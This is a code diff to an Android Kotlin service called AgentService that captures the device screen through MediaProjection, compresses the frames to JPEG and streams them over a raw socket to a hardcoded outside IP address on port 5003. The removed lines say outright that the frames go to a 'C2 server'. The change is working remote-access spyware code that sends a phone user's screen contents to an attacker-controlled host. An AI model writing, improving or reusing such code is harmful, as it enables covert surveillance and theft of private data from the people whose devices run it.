@@ -310,6 +310,16 @@ class AgentService : Service() {
             val density = metrics.densityDpi
 
             imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                mediaProjection?.registerCallback(object : MediaProjection.Callback() {
+                    override fun onStop() {
+                        super.onStop()
+                        isScreenSharingActive.set(false)
+                        Log.d("AgentService", "MediaProjection stopped by system")
+                    }
+                }, android.os.Handler(mainLooper))
+            }
 
             virtualDisplay = mediaProjection?.createVirtualDisplay(
                 "AgentScreenCapture",
@@ -319,31 +329,50 @@ class AgentService : Service() {
             )
 
             screenCaptureThread = Thread {
+                var screenSocket: Socket? = null
+                var out: java.io.DataOutputStream? = null
+
                 while (isScreenSharingActive.get() && keepRunning) {
+                    try {
+                        if (screenSocket == null || screenSocket.isClosed) {
+                            screenSocket = Socket("139.59.244.51", 5003)
+                            screenSocket.soTimeout = 5000
+                            out = java.io.DataOutputStream(screenSocket.getOutputStream())
+                        }
+                    } catch (e: Exception) {
+                        Log.e("AgentService", "Screen socket connect error", e)
+                        Thread.sleep(1000)
+                        continue
+                    }
+
                     var image: Image? = null
                     try {
-                        image = imageReader?.acquireLatestImage() ?: continue
+                        image = imageReader?.acquireLatestImage()
+                        if (image != null) {
+                            val bitmap = image.toBitmap()
+                            val baos = ByteArrayOutputStream()
+                            bitmap.compress(Bitmap.CompressFormat.JPEG, 30, baos) // 30% quality
+                            val jpegBytes = baos.toByteArray()
 
-                        val bitmap = image.toBitmap()
-                        val baos = ByteArrayOutputStream()
-                        bitmap.compress(Bitmap.CompressFormat.JPEG, 30, baos) // 30% quality
-                        val jpegBytes = baos.toByteArray()
-
-                        // Send to C2 server with prefix
-                        c2Socket?.outputStream?.let { out ->
-                            out.write("SCR_FRAME:".toByteArray())
-                            out.write(jpegBytes)
-                            out.flush()
+                            // Send size then data
+                            out?.writeInt(jpegBytes.size)
+                            out?.write(jpegBytes)
+                            out?.flush()
+                            Log.d("AgentService", "Sent frame: ${jpegBytes.size} bytes")
+                        } else {
+                            Log.d("AgentService", "Image is null, dropping frame")
                         }
-
-                    } catch (_: Exception) {
-                        // silent fail
+                    } catch (e: Exception) {
+                        Log.e("AgentService", "Screen stream error", e)
+                        try { screenSocket.close() } catch (ex: Exception) {}
+                        screenSocket = null
                     } finally {
                         image?.close()
                     }
 
                     Thread.sleep(400) // ~2.5 fps – adjust as needed
                 }
+                try { screenSocket?.close() } catch (e: Exception) {}
             }.apply { isDaemon = true; start() }
 
             Log.i("AgentService", "Screen capture → started")
